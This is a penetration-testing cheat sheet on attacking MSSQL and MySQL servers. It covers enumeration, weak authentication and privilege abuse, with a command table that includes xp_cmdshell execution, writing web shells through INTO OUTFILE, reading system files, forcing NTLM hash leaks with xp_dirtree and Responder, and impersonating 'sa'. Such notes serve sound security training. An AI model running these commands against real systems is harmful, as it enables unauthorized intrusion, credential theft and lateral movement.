# SQL Cheat sheet

#### Why Attack Databases?

* **Valuable Data**: Stores user credentials, personal identifiable info (PII), business data, payment details.
* **Power Grab**: Gain access to move laterally across the network or escalate privileges.

***

#### Attack Steps:

1. **Enumeration (Gathering Info):**
   * **Ports**:
     * MSSQL: TCP/1433 (main), UDP/1434 (discovery), TCP/2433 (hidden mode).
     * MySQL: TCP/3306.
   * **Goal**: Identify running services, versions, and hostnames using tools like Nmap.
2. **Authentication:**
   * **MSSQL**:
     * Windows Authentication: Ties to Windows/AD accounts (no extra login if trusted).
     * Mixed Mode: Uses SQL-specific usernames/passwords (e.g., sa:MyPassword!).
   * **MySQL**: Username/password (Windows auth possible with plugin).
   * **Weak Spots**: No passwords, anonymous access, or misconfigured permissions.
3. **Privileges:**
   * **High Privileges Unlock**:
     * Read/modify database contents.
     * Execute system commands.
     * Read/write files on the system.
     * Steal service hashes.
     * Impersonate other users.
     * Access linked databases/networks.
4. **Protocol-Specific Attacks:**
   * **Read/Change Data**: List databases, tables, and extract valuable info (e.g., credentials).
   * **Execute Commands**: MSSQL uses xp\_cmdshell; MySQL relies on file-based workarounds.
   * **Write Files**: Create a Web Shell in a web directory for remote control.
   * **Read Files**: Pull system files (e.g., hosts or /etc/passwd).
   * **Steal Hashes**: MSSQL tricks server to send NTLM hash via fake SMB (e.g., Responder).
   * **Impersonate Users**: MSSQL’s IMPERSONATE lets you act as a stronger user (e.g., sa).
   * **Linked Databases**: MSSQL’s Linked Servers allow lateral movement to other DBs.

***

#### Tools & Commands:

| **Tool/Command**                                              | **What It Does**                                                               |
| ------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| nmap -Pn -sV -sC -p1433 \<IP>                                 | Scans ports, detects MSSQL/MySQL, returns version/hostname (e.g., MSSQL 2017). |
| mysql -u \<user> -p\<pass> -h \<IP>                           | Connects to MySQL, opens a SQL shell for queries.                              |
| sqlcmd -S \<server> -U \<user> -P \<pass>                     | Connects to MSSQL (Windows), runs SQL commands.                                |
| sqsh -S \<IP> -U \<user> -P \<pass> -h                        | Connects to MSSQL (Linux), provides clean SQL interface.                       |
| [mssqlclient.py](http://mssqlclient.py) \<user>@\<IP> -p 1433 | Interactive MSSQL shell (Impacket), prompts for password.                      |
| xp\_cmdshell 'whoami'                                         | MSSQL: Executes OS commands (needs enabling if off).                           |
| SELECT ... INTO OUTFILE                                       | MySQL: Writes files (e.g., Web Shell) if secure\_file\_priv permits.           |
| OPENROWSET(BULK ...)                                          | MSSQL: Reads system files (e.g., C:\Windows\System32\drivers\etc\hosts).       |
| xp\_dirtree '\<fakeSMB>'                                      | MSSQL: Forces server to send hash to fake SMB (pair with Responder).           |
| EXECUTE AS LOGIN = 'sa'                                       | MSSQL: Impersonates another user (e.g., sa) for higher privileges.             |

***

#### Quick Tips:

* **Start Here**: Use Nmap to map out open ports and services.
* **Exploit Weaknesses**: Look for no-password users or open access.
* **Privilege is Key**: More privileges = more attack possibilities.
* **Hash Trick**: Pair MSSQL’s xp\_dirtree with Responder for hash theft.
